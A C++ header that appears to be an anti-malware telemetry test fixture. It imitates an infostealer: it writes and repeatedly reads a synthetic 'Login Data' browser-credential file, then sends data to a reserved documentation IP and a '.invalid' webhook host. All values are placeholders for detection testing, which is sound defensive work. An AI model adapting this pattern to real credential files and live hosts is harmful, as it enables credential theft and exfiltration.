#pragma once
// Benign guest-only validation: synthetic file content and reserved .invalid host.
#include <winhttp.h>
#include <fstream>
inline void RunTelemetryChecks() {
  CreateDirectoryW(L"C:\\Users\\Public\\antimal-probe-sensitive", nullptr);
  const wchar_t* path = L"C:\\Users\\Public\\antimal-probe-sensitive\\Login Data";
  {
    std::ofstream file(path, std::ios::binary);
    file << "ANTIMAL_SYNTHETIC_READ_PROBE_NOT_A_CREDENTIAL";
  }
  std::ofstream result(L"C:\\Users\\Public\\antimal-telemetry-results.txt");
  result << "pid=" << GetCurrentProcessId() << "\n";
  WSADATA winsock{};
  if (WSAStartup(MAKEWORD(2,2), &winsock) == 0) {
    SOCKET attempt = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (attempt != INVALID_SOCKET) {
      u_long nonblocking = 1; ioctlsocket(attempt, FIONBIO, &nonblocking);
      sockaddr_in remote{}; remote.sin_family = AF_INET; remote.sin_port = htons(443);
      InetPtonW(AF_INET, L"192.0.2.1", &remote.sin_addr); // reserved documentation address
      int status = connect(attempt, reinterpret_cast<sockaddr*>(&remote), sizeof(remote));
      result << "socket_connect=" << status << " error=" << (status == 0 ? 0 : WSAGetLastError()) << "\n";
      closesocket(attempt);
    }
    WSACleanup();
  }
  HANDLE file = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
  char content[128]{}; DWORD count = 0;
  const BOOL read = file != INVALID_HANDLE_VALUE && ReadFile(file, content, sizeof(content), &count, nullptr);
  result << "synthetic_read=" << read << " bytes=" << count << "\n";
  if (file != INVALID_HANDLE_VALUE) CloseHandle(file);
  // Bounded sustained burst, using only the fixture's synthetic file. The
  // independent completion count is compared with captured kernel read events.
  unsigned burstReads = 0;
  HANDLE burstFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
  if (burstFile != INVALID_HANDLE_VALUE) {
    for (unsigned i = 0; i < 1024; ++i) {
      LARGE_INTEGER beginning{};
      DWORD bytes = 0;
      if (SetFilePointerEx(burstFile, beginning, nullptr, FILE_BEGIN) &&
          ReadFile(burstFile, content, sizeof(content), &bytes, nullptr) && bytes == count)
        ++burstReads;
      Sleep(5);
    }
    CloseHandle(burstFile);
  }
  result << "burst_reads=" << burstReads << "\n";
  HINTERNET session = WinHttpOpen(L"AntiMal-Telemetry-Fixture", WINHTTP_ACCESS_TYPE_NO_PROXY,
      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!session) { result << "winhttp_open_error=" << GetLastError() << "\n"; return; }
  WinHttpSetTimeouts(session, 2000, 2000, 2000, 2000);
  HINTERNET connection = WinHttpConnect(session, L"antimal-webhook-probe.invalid", INTERNET_DEFAULT_HTTP_PORT, 0);
  HINTERNET request = connection ? WinHttpOpenRequest(connection, L"POST", L"/synthetic-webhook",
      nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0) : nullptr;
  if (request) {
    char payload[] = "ANTIMAL_SYNTHETIC_TEST_ONLY";
    BOOL sent = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        payload, sizeof(payload)-1, sizeof(payload)-1, 0);
    result << "http_sent=" << sent << " error=" << (sent ? 0 : GetLastError()) << "\n";
    WinHttpCloseHandle(request);
  } else result << "request_error=" << GetLastError() << "\n";
  if (connection) WinHttpCloseHandle(connection);
  WinHttpCloseHandle(session);
  result << "complete=1\n";
}
